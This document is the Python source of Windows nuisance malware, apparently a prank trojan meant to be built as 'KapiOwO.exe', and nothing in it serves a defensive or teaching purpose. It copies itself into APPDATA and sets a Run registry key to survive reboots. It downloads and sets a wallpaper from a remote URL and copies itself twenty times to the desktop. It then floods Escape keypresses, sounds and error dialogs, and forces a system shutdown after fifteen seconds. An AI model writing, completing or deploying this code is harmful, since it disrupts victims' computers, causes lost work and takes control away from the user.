import os
import sys
import shutil
import winreg
import time
import ctypes
import pyautogui
import urllib.request
import winsound
import threading

FILENAME = "KapiOwO.exe"
APP_NAME = "KapiOwOService"
IMG_URL = "https://img.itch.zone/aW1hZ2UvMTA2MTI2Ni82MDc1NDc0LnBuZw==/original/nIID%2Bn.png"
NYAW_URL = "https://github.com/andyyepes2009-wq/skid-weapon/raw/refs/heads/main/Nyaw-Original-_-FNF-Kapi-Nyaw-Sound-Effect-DJ-D322MW%20(2).wav"

def set_persistence():
    try:
        app_path = os.path.realpath(sys.executable)
        target_dir = os.getenv('APPDATA')
        target_path = os.path.join(target_dir, FILENAME)

        if app_path.lower() != target_path.lower():
            shutil.copy2(app_path, target_path)

        reg_command = f'"{target_path}"'
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.SetValueEx(reg_key, APP_NAME, 0, winreg.REG_SZ, reg_command)
    except:
        pass

def hijack_wallpaper():
    path = os.path.join(os.getenv('TEMP'), "kapi_bg.png")
    try:
        if not os.path.exists(path):
            urllib.request.urlretrieve(IMG_URL, path)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
    except:
        pass

def desktop_spam():
    try:
        desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
        current_file = os.path.realpath(sys.executable)
        for i in range(20):
            shutil.copy2(current_file, os.path.join(desktop, f"Nyaw_{i}.exe"))
    except:
        pass

def escape_spam():
    while True:
        pyautogui.press('esc')
        time.sleep(0.01)

def sound_spam():
    path = os.path.join(os.getenv('TEMP'), "kapi_nyaw.wav")
    try:
        if not os.path.exists(path):
            urllib.request.urlretrieve(NYAW_URL, path)
    except:
        pass
    while True:
        winsound.PlaySound(path, winsound.SND_FILENAME | winsound.SND_ASYNC)
        time.sleep(0.5)

def error_spam():
    while True:
        threading.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(0, "Nyaw :3", "Kapi Error", 0x10 | 0x40000), daemon=True).start()
        time.sleep(0.5)

def countdown_shutdown():
    time.sleep(15)
    os.system("shutdown /s /t 0")

def main():
    set_persistence()
    hijack_wallpaper()
    desktop_spam()

    threads = [
        threading.Thread(target=escape_spam, daemon=True),
        threading.Thread(target=sound_spam, daemon=True),
        threading.Thread(target=error_spam, daemon=True),
        threading.Thread(target=countdown_shutdown, daemon=True)
    ]
    
    for t in threads:
        t.start()

    try:
        while True:
            time.sleep(1)
            set_persistence()
    except KeyboardInterrupt:
        sys.exit()

if __name__ == "__main__":
    mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "KapiOwO_Silent_Mutex")
    if ctypes.windll.kernel32.GetLastError() != 183:
        main()
